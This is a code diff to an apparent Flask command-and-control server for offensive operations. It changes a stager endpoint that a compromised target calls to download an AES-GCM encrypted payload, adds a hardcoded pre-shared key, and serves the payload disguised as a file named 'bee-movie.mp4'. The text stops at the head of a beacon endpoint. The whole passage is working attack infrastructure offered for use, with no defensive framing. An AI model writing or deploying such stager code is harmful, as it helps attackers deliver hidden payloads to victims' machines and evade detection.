@@ -5,7 +5,7 @@ import os
 import json
 import time
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response, send_file
 from werkzeug.utils import secure_filename
 from Crypto.Cipher import AES
 from cryptography.hazmat.primitives.asymmetric import x25519
@@ -116,32 +116,34 @@ def restore_key() -> bytes:
 @app.route(STAGER_ENDPOINT)
 def send_encrypted_payload():
     """
-    Attacker calls this from the target to download the encrypted payload
+    Attacker calls this from the target to download the encrypted and b64 encoded payload
     Use pycryptodome here since target has it installed
     """
+    print("[*] stager endpoint called, sending encrypted payload...")
     # encrypt payload before sending if it doesnt exist
     encrypted_payload_path = os.path.join(PAYLOAD_FOLDER, "encrypted_payload")
     if not os.path.exists(encrypted_payload_path):
         encrypted_payload = None
-        with open(os.path.join(PAYLOAD_FOLDER, "payload"), "rb") as f:
+        with open(os.path.join(PAYLOAD_FOLDER, "good_payload"), "rb") as f:
+            pre_shared_key = bytes.fromhex(
+                "65b53ecaba31f22e75e92d9ed95d1bebd233438d72ce2f9f2ac954ca197a679f"
+            )
             plain = f.read()
-
-            pre_shared_key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
-            nonce = os.urandom(12)
-            cipher = AES.new(pre_shared_key, AES.MODE_GCM, nonce=nonce)
-            ciphertext, tag = cipher.encrypt_and_digest(plain)
-
-            encrypted_payload = nonce + ciphertext + tag
+            encrypted_payload = encrypt_data(pre_shared_key, plain)
 
         with open(encrypted_payload_path, "wb") as f:
             f.write(encrypted_payload)
 
-        return encrypted_payload
-
-    # else send existing encrypted payload
+    # send encrypted payload
     with open(encrypted_payload_path, "rb") as f:
-        payload = f.read()
-        return payload
+        encrypted_payload = f.read()
+        return Response(
+            encrypted_payload,
+            mimetype="application/octet-stream",
+            headers={
+                "Content-Disposition": "attachment; filename=bee-movie.mp4"
+            },
+        )
 
 
 @app.route(BEACON_ENDPOINT, methods=["POST"])
